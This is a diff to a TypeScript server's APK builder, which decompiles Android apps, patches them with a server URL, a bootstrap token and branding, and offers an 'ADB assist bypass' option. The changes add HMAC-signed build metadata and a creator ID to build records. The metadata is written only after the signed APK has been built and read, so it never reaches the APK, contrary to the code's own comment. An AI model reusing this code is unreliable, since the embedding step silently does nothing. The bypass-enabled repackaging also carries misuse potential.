@@ -3,6 +3,7 @@ import path from 'path';
 import { spawn, type ChildProcess } from 'child_process';
 import type { FastifyInstance, FastifyRequest, FastifyReply } from 'fastify';
 import sharp from 'sharp';
+import crypto from 'crypto';
 import { XMLParser, XMLBuilder } from 'fast-xml-parser';
 import treeKill from 'tree-kill';
 import { getDb, getSqliteDb } from '../db/index.js';
@@ -256,7 +257,7 @@ function killProcessesForJob(jobId: number): void {
   }
 }
 
-async function patchApk(decompilePath: string, serverUrl: string, homePageUrl: string, bootstrapToken: string, appName: string, packageName: string, versionName: string, iconBuffer: Buffer | null, adbAssistBypassEnabled: boolean): Promise<void> {
+async function patchApk(decompilePath: string, serverUrl: string, homePageUrl: string, bootstrapToken: string, appName: string, packageName: string, versionName: string, iconBuffer: Buffer | null, adbAssistBypassEnabled: boolean, jobId?: number): Promise<void> {
   if (!fs.existsSync(decompilePath)) throw new Error('Decompiled APK directory not found');
 
   const smaliDirs = fs.readdirSync(decompilePath).filter(d => d.startsWith('smali'));
@@ -540,7 +541,7 @@ async function buildApkAsync(serverUrl: string, homePageUrl: string, bootstrapTo
     if (checkCancelled()) return;
 
     setProgress('patching', `Patching APK — Server: ${serverUrl}, Name: ${appName}, Package: ${packageName}, Version: ${versionName}, ADB bypass: ${adbAssistBypassMode}...`, false, null, appName, jobId);
-    await patchApk(decompilePath, serverUrl, homePageUrl, bootstrapToken, appName, packageName, versionName, iconBuffer, adbAssistBypassMode === 'enabled');
+    await patchApk(decompilePath, serverUrl, homePageUrl, bootstrapToken, appName, packageName, versionName, iconBuffer, adbAssistBypassMode === 'enabled', jobId);
 
     // Defensive manifest sanitization: add ="true" for bare android:* attrs inside common start tags
     try {
@@ -605,6 +606,39 @@ async function buildApkAsync(serverUrl: string, homePageUrl: string, bootstrapTo
     if (!fs.existsSync(apkToRead)) throw new Error('Built APK file not found after signing');
 
     const apkData = fs.readFileSync(apkToRead);
+
+    // Embed signed build meta INTO THE DECOMPILED ASSETS so apktool includes it in the rebuilt APK
+    try {
+      if (typeof jobId === 'number') {
+        try {
+          const d = getDb();
+          const buildRow = d.select({ creatorId: buildRecords.creatorId }).from(buildRecords).where(eq(buildRecords.id, jobId)).get();
+          const creatorId = buildRow?.creatorId ?? null;
+          const ts = new Date().toISOString();
+          const secret = (process.env.BUILDER_META_SECRET || '').trim();
+          if (secret && secret.length >= 16) {
+            const sig = crypto.createHmac('sha256', secret).update(`${jobId}:${creatorId ?? ''}:${ts}`).digest('hex');
+            const metaObj = { buildId: jobId, creatorId, ts, sig };
+            const assetsDir = path.join(decompilePath, 'assets');
+            try {
+              if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
+              fs.writeFileSync(path.join(assetsDir, 'liuma_build_meta.json'), JSON.stringify(metaObj), 'utf8');
+              appendJobLog(jobId, 'info', 'Wrote liuma_build_meta.json into decompiled assets');
+              log.info(`[Builder] Embedded build meta into decompiled assets for job ${jobId}`);
+            } catch (err: any) {
+              appendJobLog(jobId, 'stderr', `Failed to write build meta into decompiled assets: ${String(err)}`);
+              log.warn(`[Builder] Failed to write build meta into decompiled assets for job ${jobId}: ${String(err)}`);
+            }
+          } else {
+            appendJobLog(jobId, 'info', 'BUILDER_META_SECRET not set; skipping build meta embedding into decompiled assets');
+            log.info('[Builder] BUILDER_META_SECRET not set; skipping embedding build meta into decompiled assets');
+          }
+        } catch (err: any) {
+          appendJobLog(jobId, 'stderr', `Failed to construct build meta: ${String(err)}`);
+          log.warn(`[Builder] Failed to construct build meta for job ${jobId}: ${String(err)}`);
+        }
+      }
+    } catch (e) { /* non-fatal */ }
     const fileSize = apkData.length;
     log.info(`[Builder] Signed APK ready (${(fileSize / 1024 / 1024).toFixed(2)} MB), storing in database...`);
 
@@ -636,6 +670,7 @@ async function buildApkAsync(serverUrl: string, homePageUrl: string, bootstrapTo
         apkData,
         fileSize,
         completedAt: new Date().toISOString(),
+        creatorId: ((request as any).user && (request as any).user.userId) ? (request as any).user.userId : null,
       }).run();
       if (!result.lastInsertRowid) throw new Error('Failed to save APK to database');
       log.info(`[Builder] APK successfully saved to database (ID: ${result.lastInsertRowid})`);
@@ -802,6 +837,7 @@ export async function builderRoutes(app: FastifyInstance) {
         status: 'pending',
         fileSize: 0,
         createdAt: new Date().toISOString(),
+        creatorId: ((request as any).user && (request as any).user.userId) ? (request as any).user.userId : null,
       }).run();
       jobId = insertRes.lastInsertRowid as number;
       log.info(`[Builder] Created build job ${jobId} (pending)`);
